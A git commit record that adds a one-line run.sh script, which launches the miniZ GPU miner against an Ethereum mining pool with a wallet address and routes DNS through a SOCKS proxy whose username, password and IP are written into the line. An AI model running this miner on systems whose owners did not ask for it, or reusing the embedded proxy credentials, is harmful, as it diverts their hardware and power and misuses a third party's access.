f7d851ae09a3e59ef9f0f71f7725b3e1f7fd0b3b
sbwsmg <108033976+sbwsmg@users.noreply.github.com>
2022-07-11 03:57:55 +0800

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,1 @@
+./miniZ --url=ssl://0xe293d230fd443544b97aa5691edb731eacebf643.worker@eth-asia1.nanopool.org:9443 --pass x --pers=auto --nvidia --dag-fix --socksdns=sshocean-denriop:123@15.235.163.180:9443
